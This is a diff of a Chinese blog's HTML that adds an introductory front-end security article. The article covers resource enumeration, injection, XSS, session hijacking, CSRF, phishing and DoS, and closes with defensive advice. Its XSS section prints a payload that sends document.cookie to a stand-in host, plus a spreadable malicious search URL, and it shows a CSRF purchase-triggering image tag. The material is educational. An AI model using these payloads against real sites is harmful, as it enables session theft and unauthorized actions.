@@ -7,14 +7,21 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://hongj.top">
   <link rel="manifest" href="/manifest.json">
-  <title>Archives | HongJ前端博客</title>
+  <title>前端安全 | HongJ前端博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="HongJ前端博客">
-<meta property="og:url" content="http://hongj.top/archives/index.html">
+  <meta name="description" content="##（一）常见攻击方式## “资源枚举”、“参数操纵” 和 “其它攻击”">
+<meta name="keywords" content="前端安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="前端安全">
+<meta property="og:url" content="http://hongj.top/2018/01/26/浅谈前端安全/index.html">
 <meta property="og:site_name" content="HongJ前端博客">
+<meta property="og:description" content="##（一）常见攻击方式## “资源枚举”、“参数操纵” 和 “其它攻击”">
+<meta property="og:image" content="http://pic1.win4000.com/wallpaper/2017-10-19/59e833e9527bf.jpg">
+<meta property="og:updated_time" content="2018-01-26T06:08:45.681Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="HongJ前端博客">
+<meta name="twitter:title" content="前端安全">
+<meta name="twitter:description" content="##（一）常见攻击方式## “资源枚举”、“参数操纵” 和 “其它攻击”">
+<meta name="twitter:image" content="http://pic1.win4000.com/wallpaper/2017-10-19/59e833e9527bf.jpg">
   
     <link rel="alternative" href="/atom.xml" title="HongJ前端博客" type="application/atom+xml">
   
@@ -150,36 +157,159 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-浅谈前端安全" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/26/浅谈前端安全/" class="archive-article-date">
-  	<time datetime="2018-01-26T06:08:45.647Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-26</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/26/浅谈前端安全/">前端安全</a>
+    <h1 class="article-title" itemprop="name">
+      前端安全
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2018/01/26/浅谈前端安全/" class="archive-article-date">
+  	<time datetime="2018-01-26T06:08:45.647Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="http://pic1.win4000.com/wallpaper/2017-10-19/59e833e9527bf.jpg" alt="image"></p>
+<p>##（一）常见攻击方式##</p>
+<p>“资源枚举”、“参数操纵” 和 “其它攻击”</p>
+<a id="more"></a>
+<p><strong>资源枚举</strong></p>
+<p>有时候受前人（技术前辈也好，你所接任的上一位员工也好）的影响，我们可能会约定成俗地去做某件事情，比如用骆驼命名法法来命名函数名、用</p>
+<p>JSDoc的方式来书写注释，这样会让你的团队工作更加规范。然后有一天要给项目做备份了，就直接把该项目压缩为rar文件，命名为什么呢？首选的自</p>
+<p>然是“bak.rar”，你看数据库的备份的形式不也是.bak嘛。</p>
+<p>于是乎，如果压缩包所在的地址是可访问的，那么所有人都可以轻松地下载到这个”bak.rar”文件，你的项目也不存在什么小秘密了（即使夏天夏天悄悄</p>
+<p>地过去）。</p>
+<p>这就是“资源枚举”，别有用心的人会遍历你站点所有可访问的目录，然后把一些常见的备胎文件名（比如“sql.bak”、“index-副本.html”）一个个都</p>
+<p>枚举一下，如果运气好枚举到了就直接下载。</p>
+<p>于是跟随主流在这里不是好的事情，对于重要的东西，要么放在外人不可访问的地方，要么应当给它起一个不那么好猜的名字。</p>
+<p>资源枚举也不仅仅局限于瞎找东西，聪明的人会利用线索来更好地猜东西。</p>
+<p>假设有一个站点走的伪静态的高冷路线，不想让别人知道它所使用的语言和数据库，但没有配置好后端错误信息的提示。那么“别有用心”的朋友就可以在</p>
+<p>这个站点里的某个搜索结果页面篡改url参数，导致数据库查询错误而返回数据库错误信息页面，或者输入一个根本不存在的子页面地址来获取错误信</p>
+<p>息，进而可判断该站点到底用的是什么数据库或动态语言。</p>
+<p><strong>参数操纵</strong></p>
+<p>这里包括了SQL注入、XPath注入、cgi命令执行，还有XXS和会话劫持等。前三个的攻击主要是在服务端触发的，后二者的攻击则是侧重于客户端。</p>
+<p><strong>SQL注入</strong></p>
+<p>这块不想细聊了，相信很多朋友都听到耳朵长茧，不外乎是提交含有SQL操作语句的信息给后端，后端如果没有做好过滤就执行该语句，攻</p>
+<p>击者自然可以随意操纵该站点的数据库。</p>
+<p><strong>XPath注入</strong></p>
+<p>跟SQL注入差不多，只不过这里的数据库走的xml格式，攻击方式自然也得按xml查找的语法来了</p>
+<p><strong>cgi命令</strong></p>
+<p>执行指的是用户远程访问cgi脚本时，通过提交恶意的参数让服务器执行相关的cgi命令来获取信息甚至操纵服务器。</p>
+<p><strong>XSS（cross-site scripting跨域脚本攻击）</strong></p>
+<p>攻击也是最常见的WEB攻击之一，其重点是“跨域”和“客户端执行”。我们还是拿那个图书馆网站book.com来调侃下。</p>
+<p>假设页面右上角有一个搜索书籍的地方，你随便输入一本压根就没有的书，比如“有钱任性指南”，然后点击“搜索”按钮。这时候页面(book.com/</p>
+<p>search?name=有钱任性指南)会返回一段信息：您搜索的书籍“有钱任性指南”不存在</p>
+<pre><code>`
+    &lt;script&gt;alert(&apos;没有书开个毛线书店啊&apos;)&lt;/script&gt;
+
+    &lt;script&gt;document.location=&apos;http://vajoy/get?cookie=&apos;+document.cookie&lt;/script&gt; 
+
+     //通过QQ群，或者通过群发垃圾邮件，来让其他人点击这个地址：
+
+
+    book.com/search?name=&lt;script&gt;document.location=&apos;http://vajoy/get?cookie=&apos;+document.cookie&lt;/script&gt;
+
+`
+</code></pre><p><strong>ps</strong></p>
+<p>这种便是XSS攻击中的一种，称为“Reflected XSS”——基于反射的XSS攻击，主要依靠站点服务端返回脚本，在客户端触发执行从而发起WEB攻击。</p>
+<p><strong>DOM-based or local XSS基于DOM或本地的XSS攻击</strong>。拿我现在工作的项目做比方——为用户提供免费的wifi，但是提供免费wifi的网关会往你访</p>
+<p>问的任何页面插入一段脚本，从而植入悬浮广告（当然你可以关闭它），这貌似没什么，但如果插入的脚本是获取你敏感数据的恶意脚本那就不一样了。</p>
+<p>像这种直接存在于页面，无须经过服务器返回脚本处理就直接跨域发送用户信息的行为就是基于本地的XSS攻击。</p>
+<p><strong>“Stored XSS”——基于存储的XSS攻击</strong>。它是通过贴吧啊博客园啊等地方来发表带有恶意跨域脚本的帖子或文章，从而把恶意脚本存储在里面，每个</p>
+<p>访问该帖子/文章的人就会中招。</p>
+<p><strong>会话劫持</strong></p>
+<p>HTTP会话并不安全。它在经过TCP/IP协议封装传输数据时，在传输的数据的每一个字节中插入一个32位的序列号码，这个序列号用来保持跟踪数据和提</p>
+<p>供可靠性（序列号是依循数据顺序逐步递增的）。第三方攻击者可以通过嗅探的方式来获取用户与服务器通讯中的报文信息，如果他能猜测到数据中的序</p>
+<p>列号，那便能把合法的用户断开，伪装成合法用户让自己控制后续的通话。</p>
+<p>对于会话劫持的预防，可以走SSH协议、增强网络安全系统健壮性，也可以使用无序的UUID来替代通讯中的序列号码（而非逐步递增）。</p>
+<h2 id="其它攻击"><a href="#其它攻击" class="headerlink" title="其它攻击"></a>其它攻击</h2><p>其它攻击包括有前面未提及的CSRF攻击、钓鱼攻击和拒绝服务攻击等。</p>
+<p><strong>CSRF（cross-site request forgery</strong>）</p>
+<p>翻译为跨站请求伪造，与XSS非常相似，但XSS是利用用户对当前网站的信任来发起攻击，而CSRF是利用网站对用户的信任来发起攻击。</p>
+<p>依旧拿上述的图书馆站点打个比方，如果它的安全机制很松懈——只要用户登录了网站后，只要没关闭浏览器，在任何情况都可以作为一个已通过身份验证</p>
+<p>的用户来做购书、借书操作（无须重新登录或者输入支付密码什么的，毕竟已经登录验证过一次了嘛）。</p>
+<p>那么我们给一位用户发送一份邮件怎样，里面放有一条转向购书执行页面的链接。。。噢不，那样还得用户点击它，我们想让用户看到的时候就立刻执行</p>
+<p>了购书操作，我们可以这样做——在邮件中插入一张图片：</p>
+<pre><code>&lt;img src=&apos;http://book.com/pay?bookid=100&apos;/&gt;
+</code></pre><p>img、script、iframe标签都是不受同源策略限制的，假设你使用的邮箱很直白地给用户即时显示这张图片，而该用户又刚好登录了book.com且没有关</p>
+<p>闭浏览器，那么src里的连接就会立刻访问book.com/pay页面，并按照已通过身份验证的情况来处理，从而做了购书的操作。</p>
+<p>相信现在你会很清楚为何现在的邮箱都不会直接显示邮件里的图片了吧——都是为了你的安全考虑。</p>
+<p>对于CSRF攻击，我们所能做的可以有：</p>
+<ol>
+<li><p>检查报头中的Referer参数确保请求发自正确的网站（但XHR请求可调用setRequestHeader方法来修改Referer报头）；</p>
+</li>
+<li><p>对于任何重要的请求都需要重新验证用户的身份；</p>
+</li>
+<li><p>创建一个唯一的令牌（Token），将其存在服务端的session中及客户端的cookie中，对任何请求，都检查二者是否一致。</p>
+</li>
+</ol>
+<p><strong>钓鱼攻击</strong>指的是网站的伪造，比如ta0bao.com，然后在其中应用XSS等方式发起攻击。</p>
+<p><strong>拒绝服务（DoS）</strong>指的是向网站发起洪水一样的请求（Traffic Floor），导致服务器超负荷并关闭，处理方法常规是采用QoS（Quality of Service）的软硬件解决方案。</p>
+<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p><strong>综上所述，我们可以这样审视我们的WEB站点：</strong></p>
+<ol>
+<li><p>永远不要相信客户端传来的任何信息，对这些信息都应先进行编码或过滤处理；</p>
+</li>
+<li><p>谨慎返回用户输入的信息；</p>
+</li>
+<li><p>使用黑名单和白名单处理（即“不允许哪些敏感信息”或“只允许哪些信息”，白名单的效果更好但局限性高）；</p>
+</li>
+<li><p>检查、验证请求来源，对每一个重要的操作都进行重新验证；</p>
+</li>
+<li><p>使用SSL防止第三方监听通信（但无法阻止XSS、CSRF、SQL注入攻击）；</p>
+</li>
+<li><p>不要将重要文件、备份文件存放在公众可访问到的地方；</p>
+</li>
+<li><p>会话ID无序化；</p>
+</li>
+<li><p>对用户上传的文件进行验证（不单单是格式验证，比方一张gif图片还应将其转为二进制并验证其每帧颜色值&lt;无符号8位&gt;和宽高值&lt;无符号16位&gt;）；</p>
+</li>
+<li><p>WSDL文档应当要求用户注册后才能获取；</p>
+</li>
+<li><p>在报头定义CSP（Content Security Policy）；</p>
+</li>
+</ol>
+<p>原文链接：<a href="https://www.cnblogs.com/vajoy/p/4176908.html" title="web安全浅谈" target="_blank" rel="external">点击这里</a></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/weixinma.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -191,374 +321,124 @@
 		</ul>
 	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/19/设计模式（创建型)/" class="archive-article-date">
-  	<time datetime="2018-01-19T06:31:21.881Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/19/设计模式（创建型)/">设计模式</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">前端</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/10/vue组件面向对象的应用/" class="archive-article-date">
-  	<time datetime="2018-01-10T06:54:33.540Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/10/vue组件面向对象的应用/">vue组件面向对象的应用（一）</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">前端</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
       
-        </div></section>
+
       
+
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/12/04/vue响应式原理（object（数组）的坑）/" class="archive-article-date">
-  	<time datetime="2017-12-04T09:21:10.044Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-12-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/12/04/vue响应式原理（object（数组）的坑）/">vue响应式原理（object（数组）的坑）</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">前端开发</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
   </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/12/01/依赖注入/" class="archive-article-date">
-  	<time datetime="2017-12-01T08:42:49.773Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-12-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/12/01/依赖注入/">依赖注入</a>
-    </h1>
-  
+</div>
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">前端开发</a>
-        		</li>
-      		
-		</ul>
-	</div>
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://hongj.top/2018/01/26/浅谈前端安全/" alt="微信分享二维码">
+    </div>
+</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
+
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/11/22/判断一个对象是否是数组/" class="archive-article-date">
-  	<time datetime="2017-11-22T07:47:28.677Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-22</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2018/01/19/设计模式（创建型)/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">设计模式</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/11/22/判断一个对象是否是数组/">判断一个对象是否是数组</a>
-    </h1>
+  <!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zMDcyMC83Mjc0">
+    <script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+    </script>
+<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">前端</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/11/17/微信公众号开发（一基础配置）/" class="archive-article-date">
-  	<time datetime="2017-11-17T05:43:34.942Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-17</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/11/17/微信公众号开发（一基础配置）/">微信公众号开发（一基础配置）</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">node</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/11/10/全栈项目填坑（三）/" class="archive-article-date">
-  	<time datetime="2017-11-10T09:59:21.778Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/11/10/全栈项目填坑（三）/">全栈项目填坑（三）</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">node</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/11/10/全栈项目填坑（二）/" class="archive-article-date">
-  	<time datetime="2017-11-10T09:40:25.805Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/11/10/全栈项目填坑（二）/">全栈项目填坑（二）</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">node</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/11/10/全栈项目填坑（一）/" class="archive-article-date">
-  	<time datetime="2017-11-10T09:11:15.740Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/11/10/全栈项目填坑（一）/">全栈项目填坑（一）</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">node</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
-    </nav>
   
 
 
@@ -582,8 +462,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
